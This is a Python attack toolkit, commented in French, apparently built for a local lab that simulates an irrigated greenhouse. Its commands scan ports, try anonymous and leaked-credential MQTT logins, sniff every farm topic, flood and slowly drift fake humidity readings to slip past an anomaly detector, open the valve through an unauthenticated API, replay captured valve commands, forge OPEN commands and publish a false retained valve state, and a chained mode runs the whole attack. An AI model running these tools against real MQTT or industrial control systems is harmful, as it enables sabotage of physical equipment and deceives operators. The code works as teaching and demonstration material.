"""Outils d'attaque de la serre simulée (lab local uniquement).

Options MQTT communes :
  --as viewer|maintenance|sensor-02  utilise des identifiants « fuités » (TLS 8883)
  --tls                              TLS anonyme sur 8883 (test du mode hardened)
"""

import argparse
import json
import os
import socket
import ssl
import sys
import threading
import time

import paho.mqtt.client as mqtt
import requests

HOST = os.getenv("MQTT_HOST", "mosquitto")
URL = os.getenv("DASHBOARD_URL", "http://dashboard:8080")
TOKEN = os.getenv("DEMO_TOKEN", "gdg-demo-token")
CA_FILE = "/certs/ca.crt"
LEAKED = {
    "viewer": os.getenv("LEAK_VIEWER_PASS", ""),
    "maintenance": os.getenv("LEAK_MAINTENANCE_PASS", ""),
    "sensor-02": os.getenv("LEAK_SENSOR02_PASS", ""),
}


# --------------------------------------------------------------------------- MQTT


def connect(args, client_id):
    """Connexion MQTT v5. Quitte proprement si le broker refuse."""
    who = getattr(args, "who", None)
    use_tls = bool(who) or getattr(args, "tls", False)
    port = 8883 if use_tls else 1883
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, client_id=client_id, protocol=mqtt.MQTTv5
    )
    if use_tls:
        if not os.path.exists(CA_FILE):
            sys.exit("  [x] CA absente : lancer scripts/setup.sh")
        client.tls_set(ca_certs=CA_FILE)
    if who:
        client.username_pw_set(who, LEAKED[who])

    ready = threading.Event()
    result = {}

    def on_connect(_c, _u, _flags, reason_code, _props):
        result["rc"] = reason_code
        ready.set()

    client.on_connect = on_connect
    label = f"{HOST}:{port} {'TLS' if use_tls else 'clair'} en tant que {who or 'anonyme'}"
    try:
        client.connect(HOST, port, 30)
    except (OSError, ssl.SSLError) as exc:
        sys.exit(f"  [x] {label} : connexion impossible ({exc.__class__.__name__}: {exc})")
    client.loop_start()
    if not ready.wait(5):
        client.loop_stop()
        sys.exit(f"  [x] {label} : pas de réponse du broker")
    if result["rc"].is_failure:
        client.loop_stop()
        sys.exit(f"  [x] {label} : REFUSÉ par le broker ({result['rc']})")
    print(f"  [+] connecté {label}")
    return client


def publish(client, topic, payload, retain=False):
    """Publie en QoS 1 et affiche le code de retour du broker (MQTT v5)."""
    done = threading.Event()
    result = {}

    def on_publish(_c, _u, _mid, reason_code, _props):
        result["rc"] = reason_code
        done.set()

    client.on_publish = on_publish
    client.publish(topic, payload, qos=1, retain=retain)
    done.wait(3)
    rc = result.get("rc")
    if rc is not None and rc.is_failure:
        return f"REFUSÉ ({rc})"
    return "accepté"


def subscribe(client, topic, on_message):
    granted = threading.Event()
    result = {}

    def on_subscribe(_c, _u, _mid, reason_codes, _props):
        result["rc"] = reason_codes[0]
        granted.set()

    client.on_subscribe = on_subscribe
    client.on_message = on_message
    client.subscribe(topic)
    granted.wait(3)
    rc = result.get("rc")
    if rc is not None and rc.is_failure:
        print(f"  [x] abonnement à '{topic}' REFUSÉ ({rc})")
        return False
    return True


# --------------------------------------------------------------------------- commandes


def cmd_recon(_args):
    print("[recon] ports de la ferme")
    for host, ports in (("mosquitto", [1883, 8883]), ("dashboard", [8080])):
        for port in ports:
            try:
                with socket.create_connection((host, port), timeout=1):
                    print(f"  {host}:{port} OUVERT")
            except OSError:
                print(f"  {host}:{port} fermé")


def cmd_anon(_args):
    """Tente toutes les connexions sans identifiants."""
    print("[anon] tentatives de connexion anonyme")
    for tls in (False, True):
        ns = argparse.Namespace(who=None, tls=tls)
        try:
            client = connect(ns, f"attacker-anon-{int(tls)}")
            client.loop_stop()
            client.disconnect()
        except SystemExit as exc:
            print(exc)


def cmd_sniff(args):
    messages = []
    client = connect(args, "attacker-sniff")

    def on_message(_c, _u, msg):
        messages.append(f"  {msg.topic} = {msg.payload.decode(errors='replace')}")

    if subscribe(client, args.topic, on_message):
        time.sleep(args.seconds)
    client.loop_stop()
    client.disconnect()
    print(f"[sniff] {len(messages)} messages interceptés sur '{args.topic}'")
    for line in messages[: args.limit]:
        print(line)


def cmd_flood(args):
    client = connect(args, "attacker-flood")
    results = [publish(client, "farm/sensor/humidity", str(args.value)) for _ in range(args.count)]
    client.loop_stop()
    client.disconnect()
    print(f"[flood] {args.count} mesures humidité={args.value} — broker : {results[-1]}")


def cmd_drift(args):
    """Dérive lente : chaque mesure reste sous le seuil de saut du détecteur."""
    client = connect(args, "attacker-drift")
    value = args.start
    sent = 0
    while value > args.end:
        for _ in range(args.repeat):
            publish(client, "farm/sensor/humidity", f"{value:.1f}")
            sent += 1
            time.sleep(args.delay)
        print(f"  humidité publiée : {value:.1f}", flush=True)
        value -= args.step
    client.loop_stop()
    client.disconnect()
    print(f"[drift] {sent} mesures, de {args.start} à {args.end} par pas de {args.step}")


def cmd_valve(args):
    headers = {"Authorization": f"Bearer {TOKEN}"} if args.secure else {}
    action = "close" if args.close else "open"
    response = requests.post(f"{URL}/api/valve/{action}", headers=headers, timeout=5)
    who = "opérateur légitime (token)" if args.secure else "attaquant (sans token)"
    print(f"[valve] {who} {action} → HTTP {response.status_code} — {response.text.strip()}")


def cmd_replay(args):
    """Capture une commande de vanne légitime sur le bus, puis la rejoue."""
    captured = []
    got = threading.Event()
    client = connect(args, "attacker-replay")

    def on_message(_c, _u, msg):
        try:
            payload = json.loads(msg.payload.decode())
        except ValueError:
            return
        if isinstance(payload, dict) and payload.get("command") == "OPEN":
            captured.append(msg.payload.decode())
            got.set()

    if not subscribe(client, "farm/actuator/valve", on_message):
        client.loop_stop()
        return
    print(f"[replay] écoute de farm/actuator/valve ({args.wait} s max)...")

    if args.simulate_operator:
        def operator():
            time.sleep(2)
            requests.post(f"{URL}/api/valve/open",
                          headers={"Authorization": f"Bearer {TOKEN}"}, timeout=5)
            print("  (opérateur légitime : ouverture de la vanne via l'API)")
        threading.Thread(target=operator, daemon=True).start()

    if not got.wait(args.wait):
        print("  [x] aucune commande capturée")
        client.loop_stop()
        return
    print(f"  [+] commande capturée : {captured[0]}")
    if args.close_first:
        requests.post(f"{URL}/api/valve/close",
                      headers={"Authorization": f"Bearer {TOKEN}"}, timeout=5)
        print("  (l'opérateur referme la vanne)")
    time.sleep(args.delay)
    result = publish(client, "farm/actuator/valve", captured[0])
    print(f"  [>] rejeu {args.delay} s plus tard — broker : {result}")
    client.loop_stop()
    client.disconnect()
    print("[replay] regarder le journal du dashboard et les logs du simulateur")


def cmd_forge(args):
    """Forge une commande OPEN avec le token deviné, sans clé HMAC."""
    client = connect(args, "attacker-forge")
    payload = json.dumps({"command": "OPEN", "token": args.token})
    print(f"[forge] {payload} — broker : {publish(client, 'farm/actuator/valve', payload)}")
    client.loop_stop()
    client.disconnect()


def cmd_spoof_state(args):
    """Publie un faux état de vanne retenu : l'opérateur voit ce qu'on veut."""
    client = connect(args, "attacker-spoof")
    result = publish(client, "farm/actuator/valve/state", args.state, retain=True)
    print(f"[spoof-state] faux état {args.state} (retained) — broker : {result}")
    client.loop_stop()
    client.disconnect()


def cmd_score(_args):
    response = requests.get(f"{URL}/api/model/score", timeout=5)
    print(f"[score] {response.text.strip()}")


def cmd_state(_args):
    d = requests.get(f"{URL}/api/state", timeout=5).json()
    i = d["impact"]
    print(f"[state] mode={d['mode']} vanne={d['valve']} débit={d['flow']} L/min "
          f"humidité={d['humidity']} score={d['score']} eau={i['liters']} L "
          f"impact={i['total_fcfa']:,} FCFA".replace(",", " "))
    for e in d["events"][:5]:
        print(f"  {e['t']} {e['level']:5} {e['text']}")


def cmd_reset(_args):
    response = requests.post(f"{URL}/api/reset", timeout=5)
    print(f"[reset] {response.text.strip()}")


def cmd_chain(_args):
    plain = argparse.Namespace(who=None, tls=False)
    cmd_recon(plain)
    cmd_sniff(argparse.Namespace(**vars(plain), topic="farm/#", seconds=6, limit=10))
    cmd_score(plain)
    cmd_flood(argparse.Namespace(**vars(plain), value=0, count=15))
    time.sleep(1)
    cmd_valve(argparse.Namespace(secure=False, close=False))
    time.sleep(3)
    cmd_state(plain)
    print("[chain] attaque terminée")


# --------------------------------------------------------------------------- CLI


def main():
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--as", dest="who", choices=sorted(LEAKED), help="identifiants fuités")
    common.add_argument("--tls", action="store_true", help="TLS anonyme sur 8883")

    parser = argparse.ArgumentParser(description="Attaque de la serre simulée (lab local)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    def add(name, func, mqtt_opts=False):
        p = sub.add_parser(name, parents=[common] if mqtt_opts else [])
        p.set_defaults(func=func)
        return p

    add("recon", cmd_recon)
    add("anon", cmd_anon)
    p = add("sniff", cmd_sniff, True)
    p.add_argument("--topic", default="farm/#")
    p.add_argument("--seconds", type=int, default=6)
    p.add_argument("--limit", type=int, default=20)
    p = add("flood", cmd_flood, True)
    p.add_argument("--value", type=float, default=0)
    p.add_argument("--count", type=int, default=15)
    p = add("drift", cmd_drift, True)
    p.add_argument("--start", type=float, default=65)
    p.add_argument("--end", type=float, default=25)
    p.add_argument("--step", type=float, default=2)
    p.add_argument("--repeat", type=int, default=4)
    p.add_argument("--delay", type=float, default=0.15)
    p = add("valve", cmd_valve)
    p.add_argument("--secure", action="store_true", help="avec le token opérateur")
    p.add_argument("--close", action="store_true")
    p = add("replay", cmd_replay, True)
    p.add_argument("--wait", type=int, default=20)
    p.add_argument("--delay", type=int, default=3)
    p.add_argument("--simulate-operator", action="store_true")
    p.add_argument("--close-first", action="store_true", help="l'opérateur referme avant le rejeu")
    p = add("forge", cmd_forge, True)
    p.add_argument("--token", default="gdg-demo-token")
    p = add("spoof-state", cmd_spoof_state, True)
    p.add_argument("--state", default="CLOSED")
    add("score", cmd_score)
    add("state", cmd_state)
    add("reset", cmd_reset)
    add("chain", cmd_chain)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
